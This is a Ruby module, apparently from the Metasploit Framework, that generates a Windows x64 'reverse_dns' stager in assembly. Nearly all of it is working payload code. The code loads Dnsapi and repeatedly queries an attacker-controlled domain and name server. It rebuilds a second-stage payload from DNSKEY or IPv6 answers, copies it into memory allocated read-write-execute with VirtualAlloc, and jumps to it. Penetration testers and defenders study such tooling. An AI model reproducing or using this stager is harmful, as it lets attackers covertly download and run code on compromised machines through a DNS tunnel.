# -*- coding: binary -*-

module Msf

  ###
  #
  # Complex reverse_dns payload generation for Windows ARCH_X64
  #
  ###

  module Payload::Windows::ReverseDns_x64

    include Msf::Payload::TransportConfig
    include Msf::Payload::Windows
    include Msf::Payload::Windows::BlockApi_x64
    include Msf::Payload::Windows::Exitfunk_x64

    #
    # Generate the first stage
    #
    def generate(opts = {})
      ds   = opts[:datastore] || datastore
      conf = {
              ns_server:   ds['NS_IP'],
              domain:      ds['DOMAIN'],
              server_id:   ds['SERVER_ID'],
              retry_count: ds['ReverseConnectRetries'],
              req_type:    ds['REQ_TYPE'] || "DNSKEY",
              reliable:    false
      }

      # Generate the advanced stager if we have space
      if self.available_space && required_space <= self.available_space
        conf[:exitfunk] = ds['EXITFUNC']
        conf[:reliable] = true
      end

      generate_reverse_dns(conf)
    end

    def transport_config(opts = {})
      transport_config_reverse_dns(opts)
    end

    #
    # Generate and compile the stager
    #
    def generate_reverse_dns(opts = {})
      combined_asm = %Q^
      cld                    ; Clear the direction flag.
      and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      #{asm_functions_dns()}

      start:
        pop rbp
      #{asm_reverse_dns(opts)}

      ^
      Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
    end

    #
    # Determine the maximum amount of space required for the features requested
    #
    def required_space
      # Start with our cached default generated size
      space = cached_size

      # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
      space += 29

      # Reliability adds some bytes!
      space += 44

      # The final estimated size
      # The final estimated size
      space
    end

    #
    # Generate an assembly stub with the configured feature set and options.
    #
    # @option opts [String]  :domain DOMAIN that wll be used for tunnel
    # @option opts [String]  :ns_server Optional: NS server, that will be used.
    # @option opts [Integer] :retry_count Number of retry attempts
    #
    def asm_reverse_dns(opts = {})

      retry_count   = [opts[:retry_count].to_i, 1000].max
      domain        = "#{opts[:server_id]}.#{opts[:domain]}"
      req_type      = opts[:req_type]
      ns_server     = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server] || "0.0.0.0").unpack("V").first
      domain_length = domain.length + 18

      alloc_stack = (domain_length) + (8 - (domain_length % 8))
      reliable    = opts[:reliable]

      dns_options  = 0x248
      request_type = 0x1c

      if req_type == "DNSKEY"
        dns_options  |= 2
        request_type = 0x30
      end

      #
      # Shellcode is not optimize to best size, BETA!
      # //TODO optimie shellcode!
      asm = %Q^
         ;-----------------------------------------------------------------------------;
         ; Author: Alexey Sintsov (alex.sintsov[at]gmail[dot]com)
         ; Version: 1.0 (06 November 2017)
         ;-----------------------------------------------------------------------------;
         ; Input: RBP must be the address of 'api_call'.

         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         xor rbx, rbx                   ; stack alignment
         push rbx
         ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         mov         r14, 'Dnsapi'      ; Push the bytes 'Dnsapi',0,0 onto the stack.
         push        r14
         mov         rcx, rsp
         mov         r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call        rbp                ; LoadLibraryA( "Dnsapi" )
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
         call         get_eip

      get_eip:
         pop           rax
         jmp           start_code

      hostname:
         db "7812.000g.0000.0.#{domain}", 0x00

        ;;;;;;;;;;; INCREMENT DOMAIN
      increment:
         push        rbp
         mov         rbp, rsp
         add         rbp, 0x10

         mov         rax, [rbp+8]      ; DOMAIN
         add         rax, [rbp]        ; offset

         ; domain inc proc
         mov         eax, dword ptr[rax]
         mov         ebx, eax
         shl         eax, 16
         shr         eax, 16
         shr         ebx, 16
         inc         bh
         cmp         bh, 0x3a
         jnz         increment_done
         mov         bh, 0x30
         inc         bl
         cmp         bl, 0x3a
         jnz         increment_done
         mov         bl, 0x30
         inc         ah
         cmp         ah, 0x3a
         jnz         increment_done
         mov         ah, 0x30
         inc         al

      increment_done:
         shl         ebx, 16
         or          eax, ebx
         mov         r12, [rbp + 8]
         add         r12, [rbp]
         mov         dword ptr[r12], eax
         pop         rbp
         ret         0x10

        ;;;;;;;;;;; CALL DNS
      call_dns:
         push        rbp
         mov         r15, rbp
         mov         rbp, rsp
         add         rbp, 0x10
         push        20
         push        -1

      dns_loop:
         mov         rax, [rsp + 8]
         test        rax, rax
         je          dns_loop_end              ; out of tries 8(
         mov         rax, [rsp]
         test        rax, rax
         je          dns_loop_end              ; done, got result
         push        0
         mov         rax, [rbp + 0x8]            ;  result
         push        rax
         mov         r9, [rbp + 0x10]            ;  NS IP
         mov         r8d, #{dns_options}
         mov         dx,  #{request_type}
         mov         rcx, [rbp]                ;  domain
         mov         r10, #{Rex::Text.block_api_hash('Dnsapi.dll', 'DnsQuery_A')}
         call        r15
         add         rsp, 0x30
         mov         [rsp], rax
         mov         rax, [rsp + 8]
         dec         rax
         mov         [rsp + 8], rax
         jmp         dns_loop
      dns_loop_end:
         pop         rax
         pop         rbp
         pop         rbp
         ret
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

      start_code:
        ;;;;;;;;; INIT VARS in stack

         sub         rsp, #{alloc_stack}
         mov         rcx, #{domain_length}
         mov         rdi, rsp
         mov         rsi, rax
         add         rsi, 6
         rep         movsb               ; copy domain to the stack
         xor         rax, rax
         push        rax                 ; pointer to RWX memory (for stage1)
         push        rax                 ; size of stage1
         push        rax                 ; offset
         push        rax                 ; * pointer to DNS_RECORD(as result)
         push        rax
         push        rax                 ; * IP4_ARRAY[1]
         push        #{retry_count}      ; * tries counter

         ;;;;;;;;; main proc

         mov         rbx, #{ns_server}     ; NS IP
         mov         rax, rsp
         add         rax, 16
         test        rbx, rbx
         je          no_ns_server

         ; IP4_ARRAY
         mov         [rax], 1;
         mov         [rax + 4], ebx

      no_ns_server:
         push        rax                 ; NS IP4_ARRAY pointer
         add         rax, 0x08
         push        rax                 ; DNS_RECORD pointer
         add         rax, 0x20
         push        rax                 ; DOMAIN pointer

      get_header:
         dec         [rsp + 0x18]        ; load tries number
         mov         rax, [rsp + 0x18]   ; decrement
         test        rax, rax
         je          exit_func
         mov         rax, rsp
         add         rax, 0x50
         push        rax
         push        10
         call        increment
         call        call_dns
         test        eax, eax
         jne         parse_end_br
         mov         rax, [rsp + 0x30]
         push        rax
         mov         rsi, rsp              ; pointer to DNS_RECORD
         mov         [rsi], rax            ; ESI < -pointer to DNS_RECORD
      next_iph:
         mov         rdx, [rsi]            ; RDX < -current pointer
         test        rdx, rdx
         je          parse_end_b
         mov         rbx, [rdx]
         mov         [rsi], rbx            ; save Next IP
         movzx       eax, word ptr [rdx + 0x10]
         cmp         eax, #{request_type}
         jne         next_iph
      ^

      if req_type == "IPv6" # IPv6

        asm << %Q^
         add         rdx, 0x20                ; EDX < -IP pointer
         movzx       ecx, byte ptr[rdx + 1]   ; header byte 1
         cmp         cl, 0x81                 ; If this is header flag
         jne         parse_end_b
         movzx       ecx, byte ptr[rdx]
         cmp         cl, 0xfe            ; check if fe have data flag in this header
         jne         parse_end_b

      get_size:
         movzx       eax, byte ptr[rdx + 0x0a]
         test        eax, eax
         je          parse_end_b
         cmp         eax, 1
         jne         parse_end_b
         pop         rax
         mov         eax, [rdx + 0xb]      ; SIZE of stage 1
         mov         [rsp + 0x40], rax
         jmp         parse_end
       ^
      else
        # DNSKKEY
        asm << %Q^

         add        rdx,0x28
         movzx      ecx,byte ptr ds:[rdx]          ; check status
         test       ecx,ecx                        ; If this is header flag
         jne        parse_end_b

       get_size:
         pop        rax
         mov        eax,  dword ptr ds:[rdx + 0x7]     ; get size
         mov        [rsp + 0x40], eax
         jmp        parse_end

      ^

      end

      asm << %Q^
      parse_end_br:
         xor         rax, rax
         jmp         parse_end
      parse_end_b:
         pop         rax
         xor         rax, rax
      parse_end:
         test       rax, rax
         je         get_header


         mov         rax, rsp
         mov         byte ptr[rax + 0x58], '0'          ; switch to data mode

         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;     RESET COUNTER
         mov         qword ptr[rsp + 0x18], 50
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;     GET MEM
         mov         rsi, [rsp + 0x40]           ; get size, that  we just recieved
         push        0x40                        ;
         pop         r9                          ; PAGE_EXECUTE_READWRITE
         push        0x1000                      ;
         pop         r8                          ; MEM_COMMIT
         mov         rdx, rsi                    ; the newly recieved second stage length.
         xor         rcx, rcx                    ; NULL as we dont care where the allocation is.
         mov         r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call        rbp                         ; VirtualAlloc( NULL, dwLength, MEM_COMMIT,
         add         rsp, 0x20
         mov         [rsp + 0x48], rax           ; save pointer to RWX mem
         jmp         get_data
         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  GETTING DATA LOOP
      get_data_next_try:
         dec         [rsp + 0x18]                ; retry_counter decrement
         mov         rax, [rsp + 0x18]
         test        eax, eax                    ; if retry_counter is 0, we done... sorry ggwp
         je          exit_func

      get_data:
         call        call_dns
         test        eax, eax
         jne         parse_end_db2

         mov         rax, [rsp + 0x30]
         push        rax
         mov         rax, [rsp + 0x40]
         push rax


     ip_enum:
        mov         rax, [rsp + 8]      ; RAX <-current pointer
        test        rax, rax
        je          copy_end
        mov         rbx, [rax]          ; RBX <-next pointer
        mov         [rsp + 8], rbx      ; save Next IP

        movzx       edx, word ptr [rax + 0x10]
        cmp         edx, #{request_type}
        jne         ip_enum

      ^

      if req_type == "IPv6" #IPv6
        asm << %Q^
         mov         rdx, rax
         add         rdx, 0x20           ; RDX <-IP pointer
         xor         rax, rax

         movzx       ecx, byte ptr[rdx + 1]      ; header byte 1, size for IP
         mov         al, cl
         and         cl, 0x0f                    ; apply MASK to get size of data in that IP
         cmp         cl, 0x0e                    ; amount of bytes in that IP, should be 14 or less
         ja          parse_end_db

         movzx       ebx, byte ptr[rdx]
         cmp         bl, 0xfe                    ; if FE, than index offset is 16
         je          index_16
         cmp         bl, 0xff                    ; if FF, than index offset in AL reg
         je          index_al
         jmp         parse_end_db                ; else - something wrong!

      index_16:
         mov         al, 16
         imul        rax, 0x0e
         jmp         copy_ip_as_data

      index_al:
         shr         al, 4
         imul        rax, 0x0e

      copy_ip_as_data:
         mov         rsi, rdx                ; src - IP addr
         add         rsi, 2
         mov         rbx, [rsp]
         mov         rdi, [rsp + 0x58]
         add         rdi, rbx                ; dst - RWX mem
         add         rdi, rax
         add         [rsp+0x48], rcx
         mov         rax, rcx
         cld
         rep         movsb                  ; copy
         sub         [rsp + 0x50], rax
         jmp         ip_enum
      ^
      else
        #DNSKEY
        asm << %Q^
        mov         ecx, dword ptr ds:[rax + 0x24]  ; RCX <- current size
        test        ecx, ecx
        je          parse_end_db
        sub         rcx, 3
        add         [rsp + 0x48], rcx
        sub         [rsp + 0x50], rcx
        mov         rsi, rax
        add         rsi, 0x2B                    ; RSI <-  source
        mov         rbx, [rsp]
        mov         rdi, [rsp + 0x58]
        add         rdi, rbx                     ; dst - RWX mem
        cld
        rep         movsb                        ; copy
      ^
      end

      asm << %Q^
      copy_end:
         add         rsp, 0x10
         mov         rax, [rsp + 0x40]
         test        rax, rax
         je          got_everything

         mov         rax, rsp
         add         rax, 0x50
         push        rax
         push        5
         call        increment
         jmp         get_data

      parse_end_db:
         add         rsp, 0x10
      parse_end_db2:
         mov         rax, rsp
         add         rax, 0x50
         push        rax
         push        10
         call        increment
         jmp         get_data_next_try

      got_everything:
      ;;;;;;;;;;;;;;;;;;;;;;;;;
         mov             rax, [rsp + 0x48]
         add             rax, 4
         jmp             rax
      ;;;;;;;;;;;;;;;;;;;;;;;;;

      exit_func:
    ^

      if opts[:exitfunk]
        asm << asm_exitfunk(opts)
      end

      asm
    end

    def asm_functions_dns()

      asm = %Q^
     nop
    ^

      asm
    end

    def stage_over_connection?
      false
    end

  end

end
